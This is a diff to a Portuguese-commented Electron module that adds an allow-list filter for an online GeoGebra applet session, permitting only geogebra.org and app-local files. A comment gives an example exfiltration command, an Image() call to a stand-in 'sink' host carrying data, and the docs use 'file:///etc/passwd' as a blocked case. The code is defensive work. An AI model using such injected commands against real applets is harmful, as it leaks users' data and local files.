@@ -1,6 +1,7 @@
 'use strict';
 const fs=require('node:fs');
 const path=require('node:path');
+const {fileURLToPath}=require('node:url');
 
 /* Protocolo `mesa-ggb:` do GeoGebra offline (#55), instalado SÓ na sessão da view
    do applet (`persist:geogebra`), como o `mesa-activity:` do Chart.js:
@@ -84,4 +85,52 @@ function installOfflineSession(session,{contentDir,pageFile,onBlocked}){
  blockNetwork(session,onBlocked);
 }
 
-module.exports={GGB_SCHEME,GGB_HOST,PAGE_URL,resolvePackFile,createGgbProtocolHandler,blockNetwork,installOfflineSession};
+/* Online: o applet da web precisa do `geogebra.org` (e subdomínios) para
+   carregar; o resto é recusado na sessão da view. Um `evalCommand` do tutor
+   como `Image("https://sink.exemplo/p.png?d=DADOS")` ou `Image("file:///...")`
+   vazaria dados ou leria arquivo local pelo screenshot: com o filtro, o pedido
+   nem sai (http(s)/ws(s)/ftp de outro host, `file:` fora do app e qualquer
+   protocolo estranho caem no `onBlocked`). `data:`/`blob:` passam (assets
+   internos do applet); o `mesa-ggb:` passa (inoffensivo sem o pacote). */
+
+/**
+ * O pedido pode sair da sessão da view online?
+ * @param {string} raw URL pedida
+ * @param {string} [appDir] pasta do app: o único `file:` liberado é o de dentro dela
+ * @returns {boolean}
+ * @example ggbOnlineAllowed('https://www.geogebra.org/apps/deployggb.js', '/app/desk') // true
+ * @example ggbOnlineAllowed('http://127.0.0.1:9/p.png', '/app/desk') // false
+ * @example ggbOnlineAllowed('file:///etc/passwd', '/app/desk') // false
+ */
+function ggbOnlineAllowed(raw,appDir=''){
+ let parsed;
+ try{parsed=new URL(String(raw));}catch{return false;}
+ const protocol=parsed.protocol.toLowerCase();
+ if(protocol==='data:'||protocol==='blob:')return true;
+ if(protocol==='http:'||protocol==='https:'||protocol==='ws:'||protocol==='wss:'||protocol==='ftp:')return /(^|\.)geogebra\.org$/i.test(parsed.hostname);
+ if(protocol===`${GGB_SCHEME}:`)return true;
+ if(protocol!=='file:'||!appDir)return false;
+ let file,base;
+ try{file=fs.realpathSync(fileURLToPath(raw));}catch{return false;}
+ try{base=fs.realpathSync(appDir);}catch{return false;}
+ return file===base||file.startsWith(base+path.sep);
+}
+
+/**
+ * Fecha a rede da sessão da view online: só `geogebra.org` e o app.
+ * @param {{webRequest?:{onBeforeRequest:Function}}} session
+ * @param {{appDir?:string,onBlocked?:(url:string)=>void}} [options]
+ * @returns {boolean} false quando a sessão não tem `webRequest`
+ */
+function installOnlineSession(session,{appDir='',onBlocked}={}){
+ if(!session||!session.webRequest||typeof session.webRequest.onBeforeRequest!=='function')return false;
+ session.webRequest.onBeforeRequest((details,callback)=>{
+  let ok;
+  try{ok=ggbOnlineAllowed(details.url,appDir);}catch{ok=false;}
+  if(!ok&&typeof onBlocked==='function'){try{onBlocked(details.url);}catch{/* o log não pode derrubar o filtro */}}
+  callback({cancel:!ok});
+ });
+ return true;
+}
+
+module.exports={GGB_SCHEME,GGB_HOST,PAGE_URL,resolvePackFile,createGgbProtocolHandler,blockNetwork,installOfflineSession,ggbOnlineAllowed,installOnlineSession};
